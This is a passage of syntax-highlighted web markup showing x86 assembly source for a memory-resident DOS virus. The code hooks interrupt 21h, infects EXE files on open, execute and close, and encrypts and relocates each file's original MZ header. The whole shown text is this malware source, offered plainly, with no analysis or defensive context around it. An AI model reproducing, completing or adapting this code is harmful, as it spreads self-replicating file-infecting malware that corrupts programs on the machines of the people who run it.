   </span><span class="sc5">to_popa_ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_popa_ret</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24h</span><span class="sc4">-</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">;ax, bx, si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_24</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">;set read/write file atributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">         
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_2popa_ret</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">        </span><span class="sc1">;open file in read/write mode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">restore_atrib</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">;cx, dx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">        </span><span class="sc1">;get data &amp; time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">b_start</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_MZ_low_ptr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">;clean or infect</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">err_file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">;al!=0 (check this while debugin)</span><span class="sc0">

      </span><span class="sc5">err_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">        </span><span class="sc1">;set data &amp; time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                
    </span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">          </span><span class="sc1">;close file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

 </span><span class="sc5">restore_atrib</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">        </span><span class="sc1">;restore old atributes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">

 </span><span class="sc5">end_2popa_ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int</span><span class="sc0">

  </span><span class="sc5">end_popa_ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc5">end_ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;infects a file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">b_size_bytes</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">;encrypt old MZ header</span><span class="sc0">
       </span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C5h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">;move file pointer to end of file</span><span class="sc0">
                </span><span class="sc6">cwd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_ret</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write</span><span class="sc0">           </span><span class="sc1">;write old MZ header to end of file</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_popa_ret</span><span class="sc0">

                </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">;move virus code to buffer area</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_MZ_Magic</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc5">move_virus</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_virus</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;hardcode file location in virus code</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ptr2new</span><span class="sc0">         </span><span class="sc1">;move file pointer to actual MZ header</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_int</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;gets an interrupt vector</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  SI = int number * 4</span><span class="sc0">
                </span><span class="sc1">;  DS = 0</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  DX:AX = int vector adress retrieved</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">clean</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;cleans an infected file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;old_MZ_high_ptr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;old_MZ_low_ptr</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ptr2old</span><span class="sc0">         </span><span class="sc1">;move file pointer to old MZ header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_popa_ret</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read</span><span class="sc0">            </span><span class="sc1">;read old MZ header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_popa_ret</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">si.MZ_magic</span><span class="sc4">],</span><span class="sc2">1234h</span><span class="sc0"> </span><span class="sc1">;check old MZ header</span><span class="sc0">
   </span><span class="sc5">old_MZ_Magic</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_popa_ret</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">;decrypt old MZ header</span><span class="sc0">
       </span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C5h</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0">

                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ptr2old</span><span class="sc0">         </span><span class="sc1">;move file pointer to old MZ header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ptr2new</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;remove old MZ header from end of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">

       </span><span class="sc5">ptr2new</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ptr2begin</span><span class="sc0">       </span><span class="sc1">;move file pointer to actual MZ header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_clean</span><span class="sc0">

</span><span class="sc5">write</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;write MZ header</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">read</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">          </span><span class="sc1">;read MZ header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">b_start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">b_size_bytes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">end_rd_wr</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
     </span><span class="sc5">end_rd_wr</span><span class="sc4">:</span><span class="sc0">

     </span><span class="sc5">end_clean</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
     
</span><span class="sc5">clean</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">entry_point</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30AFh</span><span class="sc0">
                </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">21h</span><span class="sc4">-</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">x</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old_int_21</span><span class="sc0">    </span><span class="sc1">;check if already installed</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">0AFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">already</span><span class="sc0">                 </span><span class="sc1">;yea we're instaled, jump</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;hook int 21h &amp; stay resident</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc5">x</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc5">x</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int_21</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int</span><span class="sc0">

       </span><span class="sc5">already</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc2">2Ch</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get program filename</span><span class="sc0">
      </span><span class="sc5">get_prog</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">get_prog</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc5">@copysz</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">common_clean_ds</span><span class="sc0">         </span><span class="sc1">;clean infected program</span><span class="sc0">

</span><span class="sc5">exec</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flag</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;prevent circular execution</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">p_block</span><span class="sc0">       </span><span class="sc1">;execute program</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">common_infect</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">          </span><span class="sc1">;exit to DOS</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">

</span><span class="sc5">p_block</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;parameter block to be used by 4B00h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5Ch</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6Ch</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">new_24</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">ptr2begin</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">;move file pointer to actual MZ header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">ptr2old</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc5">call_int_21</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">;call old INT 21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">jmp_int_21</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">set_int</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;sets an interrupt vector</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  SI = int number * 4</span><span class="sc0">
                </span><span class="sc1">;  DS = 0</span><span class="sc0">
                </span><span class="sc1">;  DX:AX = int vector adress to store</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">infect_on_close</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;infect on file close</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">             </span><span class="sc1">;use file system tablez</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">fail_dcb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmc</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">fail_dcb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
      </span><span class="sc5">fail_dcb</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_int_21</span><span class="sc0">             </span><span class="sc1">;close file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.Pusha_ax</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">fail_close</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">fail_close_clc</span><span class="sc0">
